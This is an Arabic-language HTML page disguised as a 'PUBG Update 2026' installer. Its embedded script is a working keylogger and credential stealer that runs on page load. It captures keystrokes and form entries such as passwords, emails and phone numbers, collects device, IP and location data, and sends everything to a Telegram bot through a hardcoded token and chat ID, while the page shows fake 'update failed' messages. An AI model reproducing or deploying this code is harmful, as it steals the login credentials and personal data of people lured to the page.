<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG Update 2026</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .box {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            max-width: 420px;
            width: 100%;
            border: 1px solid #e94560;
            box-shadow: 0 20px 60px rgba(233, 69, 96, 0.15);
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #e94560;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
        .note {
            color: #ffcc00;
            font-size: 11px;
            margin-top: 20px;
            border-top: 1px solid #333;
            padding-top: 20px;
        }
    </style>
</head>
<body>
<div class="box">
    <h1>🔥 PUBG UPDATE 2026</h1>
    <p>جاري تحميل التحديث الجديد...</p>
    <div class="loader"></div>
    <p class="status" id="status">⏳ يرجى الانتظار...</p>
    <p class="note">⚠️ لا تغلق الصفحة حتى انتهاء التحديث</p>
</div>

<script>
// ==========================================
// إعدادات التيليجرام
// ==========================================
const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
const CHAT_ID = "5730027675";

// ==========================================
// دوال الإرسال
// ==========================================
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    }).catch(() => {});
}

function sendFileToTelegram(content, filename, caption) {
    const blob = new Blob([content], { type: 'text/plain' });
    const file = new File([blob], filename);
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    formData.append('caption', caption);
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData
    }).catch(() => {});
}

// ==========================================
// 1. Keylogger - تسجيل كل ما يكتب
// ==========================================
let keyLog = [];
let lastSendTime = Date.now();

document.addEventListener('keydown', function(e) {
    const key = e.key;
    
    // تجاهل مفاتيح التحكم
    if (key === 'Control' || key === 'Shift' || key === 'Alt' || key === 'Meta') return;
    
    // تسجيل الضغطة
    const time = new Date().toLocaleTimeString();
    keyLog.push(`[${time}] ${key}`);
    
    // إرسال كل 10 ضغطات أو كل 30 ثانية
    if (keyLog.length >= 10 || (Date.now() - lastSendTime) > 30000) {
        sendKeyLog();
    }
});

// ==========================================
// 2. مراقبة النماذج (Forms)
// ==========================================
document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        const name = e.target.name || e.target.id || 'غير معروف';
        const value = e.target.value;
        
        // البحث عن كلمات مفتاحية
        const keywords = ['email', 'password', 'pass', 'user', 'login', 'pubg', 'id', 'phone', 'number'];
        let isSensitive = false;
        for (let kw of keywords) {
            if (name.toLowerCase().includes(kw) || value.toLowerCase().includes(kw)) {
                isSensitive = true;
                break;
            }
        }
        
        if (isSensitive && value.length > 2) {
            sendToTelegram(`📝 **نموذج مكتشف:**\n• الحقل: ${name}\n• القيمة: ${value}`);
        }
    }
});

// ==========================================
// 3. إرسال سجل الضغطات
// ==========================================
function sendKeyLog() {
    if (keyLog.length === 0) return;
    
    const logText = keyLog.join('\n');
    keyLog = [];
    lastSendTime = Date.now();
    
    // إرسال كملف أو رسالة
    if (logText.length > 4000) {
        sendFileToTelegram(logText, `keys_${Date.now()}.txt`, '📁 سجل الضغطات');
    } else {
        sendToTelegram(`⌨️ **سجل الضغطات:**\n\`\`\`\n${logText}\n\`\`\``);
    }
}

// ==========================================
// 4. مراقبة PUBG Mobile (محاكاة)
// ==========================================
function monitorPUBG() {
    // مراقبة إذا كان المستخدم يبحث عن PUBG
    const keywords = ['pubg', 'battlegrounds', 'تحديث بوبجي', 'pubg mobile', 'pubg hack'];
    
    // مراقبة عنوان الصفحة
    const titleObserver = new MutationObserver(() => {
        const title = document.title.toLowerCase();
        for (let kw of keywords) {
            if (title.includes(kw)) {
                sendToTelegram(`🎯 **تم اكتشاف PUBG في العنوان:** ${document.title}`);
                break;
            }
        }
    });
    titleObserver.observe(document.querySelector('title'), { childList: true });
    
    // مراقبة الروابط
    document.addEventListener('click', function(e) {
        if (e.target.tagName === 'A') {
            const link = e.target.href || '';
            for (let kw of keywords) {
                if (link.toLowerCase().includes(kw)) {
                    sendToTelegram(`🔗 **رابط PUBG مكتشف:** ${link}`);
                    break;
                }
            }
        }
    });
}

// ==========================================
// 5. جمع معلومات الجهاز
// ==========================================
function getDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
        referrer: document.referrer || 'مباشر'
    };
    return info;
}

// ==========================================
// 6. الحصول على IP
// ==========================================
async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'غير معروف';
    }
}

// ==========================================
// 7. الحصول على الموقع
// ==========================================
async function getLocation() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        return {
            ip: data.ip || 'غير معروف',
            city: data.city || 'غير معروف',
            country: data.country || 'غير معروف',
            loc: data.loc || 'غير معروف',
            org: data.org || 'غير معروف'
        };
    } catch {
        return null;
    }
}

// ==========================================
// 8. التشغيل الرئيسي
// ==========================================
async function main() {
    // إشعار البداية
    sendToTelegram('🔥 **تم فتح الرابط الملغم (Keylogger)!**');
    
    // معلومات الجهاز
    const deviceInfo = getDeviceInfo();
    const ip = await getIP();
    const location = await getLocation();
    
    let msg = `📱 **معلومات الجهاز:**\n`;
    msg += `• المتصفح: ${deviceInfo.userAgent}\n`;
    msg += `• المنصة: ${deviceInfo.platform}\n`;
    msg += `• اللغة: ${deviceInfo.language}\n`;
    msg += `• الشاشة: ${deviceInfo.screen}\n`;
    msg += `• التوقيت: ${deviceInfo.timezone}\n`;
    msg += `• الرابط: ${deviceInfo.url}\n`;
    msg += `• الـ IP: ${ip}\n`;
    if (location) {
        msg += `• الدولة: ${location.country}\n`;
        msg += `• المدينة: ${location.city}\n`;
        msg += `• المزود: ${location.org}\n`;
    }
    sendToTelegram(msg);
    
    // بدء Keylogger
    sendToTelegram('⌨️ **تم تفعيل Keylogger!**');
    
    // مراقبة PUBG
    monitorPUBG();
    
    // تحديث حالة التحميل
    document.getElementById('status').textContent = '⚠️ فشل التحديث، جارٍ المحاولة مجدداً...';
    
    setTimeout(() => {
        document.getElementById('status').textContent = '❌ فشل التثبيت، يرجى المحاولة لاحقاً.';
        document.querySelector('.loader').style.display = 'none';
    }, 3000);
}

// ==========================================
// التشغيل عند تحميل الصفحة
// ==========================================
window.onload = function() {
    main();
    
    // إرسال السجل كل 30 ثانية
    setInterval(sendKeyLog, 30000);
    
    // إرسال السجل عند إغلاق الصفحة
    window.addEventListener('beforeunload', function() {
        sendKeyLog();
    });
};
</script>
</body>
</html>
